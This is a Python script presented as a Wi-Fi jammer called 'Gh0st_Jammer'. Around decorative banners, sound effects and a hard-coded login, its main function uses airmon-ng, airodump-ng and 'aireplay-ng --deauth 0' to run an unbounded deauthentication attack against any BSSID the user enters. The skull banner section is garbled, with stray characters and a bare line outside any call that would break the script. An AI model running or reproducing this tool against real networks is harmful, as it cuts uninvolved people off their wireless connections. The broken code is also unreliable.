#!/usr/bin/env python3
import os
import sys
import time
import subprocess
from getpass import getpass
from rich.console import Console
from rich.panel import Panel
from rich.text import Text
from rich.progress import Progress, SpinnerColumn, BarColumn, TextColumn, TimeElapsedColumn
from rich import box

console = Console()

# =====================
# Configuration
# =====================
USERNAME = "kuldeep"
PASSWORD = "hacker123"
AUDIO_FILES = {
    "intro": "intro.mp3",
    "exit": "exit.mp3"
}

# Check for missing audio files
for key, file in AUDIO_FILES.items():
    if not os.path.exists(os.path.join(os.path.dirname(__file__), file)):
        console.print(f"[bold yellow]⚠️ Missing audio file: {file} (Place it in the script's directory)[/bold yellow]")

# Detect Platform
def detect_platform():
    if "termux" in os.environ.get('PREFIX', '').lower():
        return "termux"
    elif os.path.exists('/etc/blackarch-release'):
        return "blackarch"
    elif os.path.exists('/etc/kali-release'):
        return "kali"
    elif os.path.exists('/etc/lsb-release') and 'ubuntu' in open('/etc/lsb-release').read().lower():
        return "ubuntu"
    else:
        return "unknown"

PLATFORM = detect_platform()

# Set Interface
INTERFACE = "wlan0"  # Default (Termux uses the same)

# =====================
# Audio Playback System (Fixed)
# =====================
def play_voice(filename):
    try:
        path = os.path.join(os.path.dirname(__file__), AUDIO_FILES[filename])
        if not os.path.exists(path):
            console.print(f"[bold red]⚠️ Audio file '{AUDIO_FILES[filename]}' not found![/bold red]")
            return

        if PLATFORM == "termux":
            if os.system("which termux-media-player >/dev/null 2>&1") == 0:
                os.system(f'termux-media-player play "{path}" >/dev/null 2>&1')
            else:
                console.print("[bold yellow]⚠️ 'termux-media-player' not installed. Install with:[/bold yellow]\n[bold cyan]pkg install termux-api[/bold cyan]")
        else:
            if os.system("which mpg123 >/dev/null 2>&1") == 0:
                os.system(f'mpg123 "{path}" >/dev/null 2>&1')
            elif os.system("which aplay >/dev/null 2>&1") == 0:
                os.system(f'aplay "{path}" >/dev/null 2>&1')
            else:
                console.print("[bold yellow]⚠️ Install 'mpg123' or 'aplay' for audio.[/bold yellow]")
    except Exception as e:
        console.print(f"[bold red]❌ Audio Error: {str(e)}[/bold red]")

# =====================
# Animation Loader
# =====================
def wait_anim(message="Summoning the ghost...", seconds=4):
    with Progress(
        SpinnerColumn(style="red"),
        TextColumn("[progress.description]{task.description}"),
        BarColumn(bar_width=None),
        TimeElapsedColumn(),
        transient=True,
    ) as progress:
        task = progress.add_task(f"[bold green]{message}", total=seconds)
        for _ in range(seconds):
            time.sleep(1)
            progress.advance(task)

def clear_screen():
    os.system("clear" if os.name == "posix" else "cls")

# =====================
# Login Banner (Standard)
# =====================
def banner_main():
    clear_screen()
    banner = """
 ██████╗ ██╗  ██╗ ██████╗ ███████╗████████╗         ███████╗██╗
██╔════╝ ██║  ██║██╔═████╗██╔════╝╚══██╔══╝         ██╔════╝██║
██║  ███╗███████║██║██╔██║███████╗   ██║            █████╗  ██║
██║   ██║██╔══██║████╔╝██║╚════██║   ██║   ██████   ██╔══╝  ██║
 ╚═════╝ ╚═╝  ╚═╝ ╚═════╝ ╚══════╝   ╚═╝   ╚════╝  ╚═╝     ╚═╝                                                     
            ██╗ █████╗ ███╗   ███╗███████╗██████╗        
            ██║██╔══██╗████╗ ████║██╔════╝██╔══██╗       
            ██║███████║██╔████╔██║█████╗  ██████╔╝       
       ██   ██║██╔══██║██║╚██╔╝██║██╔══╝  ██╔══██╗       
       ╚█████╔╝██║  ██║██║ ╚═╝ ██║███████╗██║  ██║       
        ╚════╝ ╚═╝  ╚═╝╚═╝     ╚═╝╚══════╝╚═╝  ╚═╝                                                  
"""
    panel = Panel.fit(Text(banner, style="bold cyan"),
                      title="🔥 Gh0st_Jammer (WiFi Jammer) 🔥",
                      subtitle=f"Platform: {PLATFORM.upper()} | Created by Kuldeep Chauhan",
                      border_style="bright_red", box=box.HEAVY)
    console.print(panel)
    wait_anim("Loading tool...", 3)

# =====================
# Bhayanak Skull Banner (After Login)
# =====================
def print_scary_banner():
    skull = Text()
    skull.append("⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣀⣀⡤⠤⠤⠤⠤⠤⠤⣄⣀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀\n", style="bold yellow")
    skull.append("⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣀⣀⡤⠤⠤⠤⠤⠤⠤⣄⣀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀\n", style="bold yellow")
    skull.append("⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣠⠤⠖⢉⠭⠀⠴⠘⠩⡢⠏⠘⡵⢒⠬⣍⠲⢤⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀\n", style="bold yellow")⠀
    skull.append("⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⡴⠊⣡⠔⠃⠀⠰⠀⠀⠀⠀⠈⠂⢀⠀⢋⠞⣬⢫⣦⣍⢢⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀\n", style="bold yellow")
    skull.append("⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣠⢫⣼⠿⠁⠀⠀⠀⠐⠀⠀⠰⠀⠢⠈⠀⠠⠀⢚⡥⢏⣿⣿⣷⡵⡄⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀\n", style="bold yellow")
    skull.append("⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢰⢓⣽⡓⡅⠀⠀⠀⠄⠀⠀⠄⠀⠁⠀⠀⠌⢀⠀⡸⣜⣻⣿⣿⣿⣿⣼⡀⠀⠀⠀⢀⣀⣀⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀\n", style="bold yellow")
    skull.append("⠀⢀⡤⣤⣄⣠⠤⣄⠀⠀⠀⠀⠀⠀⠀⢀⣧⣿⡷⠹⠂⠀⠂⠀⢀⠠⠈⠀⠌⠀⠁⢈⠀⠄⢀⡷⣸⣿⣿⣿⣿⣿⣧⠃⠀⡴⢋⢠⣤⣦⣬⣕⢤⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀\n", style="bold yellow")
    skull.append("⣔⣵⣿⣻⣯⣍⣉⠚⢕⢆⠀⠀⠀⠀⠀⢸⢾⣽⡷⡂⠀⠀⠄⠂⠀⡀⠄⠂⠀⠌⠀⡀⠀⢀⡾⣯⢿⣿⣿⣿⣿⣿⣿⠰⠸⠠⢠⣾⣿⣿⣷⣿⣷⣕⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀\n", style="bold yellow")
    skull.append("⣼⣿⣿⠿⠿⢿⣿⣇⡛⡻⣧⠀⠀⠀⠀⢼⢸⡟⡧⣧⠀⠃⠀⡀⠄⠀⢀⠠⠘⠀⠠⠀⠀⡟⢧⣛⣿⣿⣿⣿⣿⣿⣧⠇⠀⡇⢻⣿⣿⣿⠟⠻⣿⣿⣇⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀\n", style="bold yellow")
    skull.append("⣿⣿⠁⣠⣤⠀⠙⢿⣿⡤⢘⣆⠀⠀⠀⢹⣼⣿⡽⠖⠁⠀⢤⠀⠀⡐⠀⢀⠐⠈⠀⢠⠖⠙⠣⠟⣻⢿⣿⣟⣿⡿⠃⠀⠀⠃⢼⣿⣧⠀⠀⠀⠸⣿⣣⠇⠀⠀⠀⠀⠀⠀⠀⠀⠀\n", style="bold yellow")
    skull.append("⣿⣿⣆⣿⡟⠀⠀⠀⣿⡇⠰⢸⠀⠀⠀⡸⡻⡕⠉⠀⠀⡐⠀⠈⠁⠀⠀⢠⠀⡴⠀⡠⠀⢀⠤⡲⠟⣉⠻⣿⣟⠁⠀⠀⠀⡅⢺⣿⣿⠃⠀⠀⠀⠈⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀\n", style="bold yellow")
    skull.append("⠈⠙⠛⠉⠀⠀⠀⣀⡿⣗⠧⣼⠀⠄⡎⣿⣇⣧⣀⠑⢆⠀⠀⠀⢹⢄⢀⢧⠊⢀⠊⠀⠘⡡⣪⡴⠛⢻⣷⣜⣿⣦⠀⠀⡀⡿⣸⣿⣿⡆⠀⠀⡠⢐⠫⠉⠩⠭⣗⣦⡀⠀⠀⠀⠀\n", style="bold yellow")
    skull.append("⠀⠀⠀⠀⠀⠀⢠⢹⣷⣻⠇⣿⠘⡀⣿⣿⣿⣿⠛⠛⢦⣙⠄⠀⢈⣫⢼⠀⠤⠁⠀⣠⣾⣿⡇⠀⠐⠂⢻⣿⣟⣿⡇⢠⠃⣧⣿⣿⣾⠁⢀⢎⣴⡶⡿⢿⣟⣷⢮⡝⢿⣷⠤⡀⠀\n", style="bold yellow")
    skull.append("⠀⠀⠀⠀⠀⠀⠈⣽⣯⢿⣣⡹⢰⠘⣿⡿⣹⣿⠀⠀⠹⣿⡿⣷⣬⣯⣾⣷⣤⣴⣾⡟⣍⡿⠃⠀⠀⠀⢸⣿⣿⣩⣒⣵⣷⣿⣿⡿⠃⠀⡞⢺⣿⣿⣯⢿⠉⠀⠉⠛⢦⣻⣇⠘⡆\n", style="bold yellow")
    skull.append("⠀⠀⠀⠀⠀⠀⣀⣿⣾⡾⣿⣵⡢⠳⢿⣷⢹⣿⣆⠀⠀⠈⠉⢉⣽⢟⣿⠟⢻⢿⣷⣄⡁⠀⠀⠀⠀⣀⣾⡟⣍⣿⣿⣿⣿⣿⣿⡗⠀⠀⠇⣽⣿⣿⣿⡼⠀⠀⣠⡤⣀⠿⠏⣴⠇\n", style="bold yellow")
    skull.append("⠀⠀⠀⠀⠀⠀⠸⡼⣿⣿⣽⣿⣿⣶⣬⣿⣯⢿⣷⣥⠶⣒⣶⣾⠏⠐⠙⠀⠈⠚⡌⢪⣿⣧⣖⠦⡭⠿⢛⣼⣿⣿⢿⣿⣿⡿⠝⠁⠀⠰⢀⣿⣿⣾⣿⡇⠀⠀⠻⢿⡝⠲⠛⠋⠀\n", style="bold yellow")
    skull.append("⠀⠀⠀⠀⠀⠀⠀⠉⢿⣿⣿⣿⣿⣿⣿⡿⠻⢷⣮⣉⣭⣡⣟⡱⠀⠀⡀⢀⡞⢀⢠⡀⠹⣿⣿⣿⣿⣾⣿⣿⣿⣿⣿⣟⠋⠀⠀⠀⡠⡡⣹⣿⣿⣿⠿⠡⢀⣀⠀⠾⠁⠀⠀⠀⠀\n", style="bold yellow")
    skull.append("⠀⠀⠀⠀⠀⠀⠀⠀⠈⠻⠽⢿⢿⣻⡿⠈⢀⣶⣿⣿⣿⣿⡽⠃⢀⡴⣰⣿⢤⣓⢿⣿⣄⠙⣻⣷⡟⣿⣿⣿⣽⡻⣿⠿⠧⡶⣒⢭⣺⣽⣿⠟⢍⢀⠀⡉⠑⢶⣯⡲⣄⠀⠀⠀⠀\n", style="bold yellow")
    skull.append("⠀⠀⠀⠀⣀⣀⡀⠀⠀⠀⣟⣷⣞⡟⠉⣴⡿⣯⣷⣿⣿⡟⡡⢀⣜⣼⣿⣿⣎⢳⢿⢻⣿⡄⠑⠿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡿⣟⣾⣿⣿⢃⣠⣤⢖⡾⢷⡲⣆⡳⣿⣮⢢⡄⠀⠀\n", style="bold yellow")
    skull.append("⠀⠀⡔⣩⢦⣐⣈⣦⣄⡠⢗⣿⣾⢁⣼⢏⣿⣿⣿⣿⡟⠐⣠⢝⣾⣿⣿⣿⣯⡟⣷⣿⣻⣿⣿⣟⣿⢸⣿⣿⣿⢻⣿⣿⣿⣦⠀⠀⠀⠈⠉⠉⠉⠉⠉⠉⠉⠉⠉⠉⠉⠉⠉⠉⠉⠉⠉⠉⠉⠉⠉⠉⠉⠉⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀\n", style="bold yellow")
⠀⠀⠀⠠⣿⣿⣿⠀⠈⠋⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀\n", style="bold yellow")

    panel = Panel.fit(skull, title="🔪 WARNING: MALICIOUS ACTIVITY DETECTED  🔪", subtitle="Running as ROOT", border_style="red", padding=1)
    console.print(panel)
    play_voice("intro")  # Play eerie intro sound

# =====================
# Login System
# =====================
def authenticate():
    clear_screen()
    banner_main()
    max_attempts = 3
    for attempt in range(max_attempts):
        entered_user = input("\n[bold cyan][?][/] Username: ")
        entered_pass = getpass("[bold red][?][/] Password: ")
        if entered_user == USERNAME and entered_pass == PASSWORD:
            return True
        console.print(f"\n[bold red]⚠️ Invalid credentials ({attempt + 1}/{max_attempts})[/bold red]")
        time.sleep(2)
        clear_screen()
    return False

# =====================
# Main Jammer Function
# =====================
def jam_wifi():
    try:
        print_scary_banner()
        wait_anim("Scanning networks...", 5)

        # Put interface in monitor mode
        subprocess.run(["airmon-ng", "start", INTERFACE], check=True)
        mon_interface = f"{INTERFACE}mon"  # e.g., wlan0mon

        # Run airodump-ng to list targets (replace with your target selection logic)
        console.print("\n[bold green]🔍 Targets detected:[/bold green]")
        subprocess.run(["airodump-ng", mon_interface], check=True)

        # Replace with actual target BSSID/channel (example)
        BSSID = input("\n[bold cyan]🎯 Target BSSID: [/bold cyan]")
        CHANNEL = input("[bold cyan]📡 Channel: [/bold cyan]")

        # Start deauth attack
        with console.status("[bold red]💀 Jamming... (Ctrl+C to stop)[/bold red]") as status:
            subprocess.Popen(["aireplay-ng", "--deauth", "0", "-a", BSSID, mon_interface])
            time.sleep(10)  # Adjust duration as needed

    except KeyboardInterrupt:
        console.print("\n[bold yellow]🛑 Stopping jammer...[/bold yellow]")
    except Exception as e:
        console.print(f"[bold red]❌ ERROR: {e}[/bold red]")
    finally:
        # Cleanup monitor mode
        subprocess.run(["airmon-ng", "stop", mon_interface], timeout=10)
        play_voice("exit")  # Play exit sting
        console.print("\n[bold green]✅ Jammer terminated safely.[/bold green]")

# =====================RUN=====================
if __name__ == "__main__":
    if authenticate():
        jam_wifi()
    else:
        console.print("[bold red]🚫 Maximum login attempts exceeded![/bold red]")
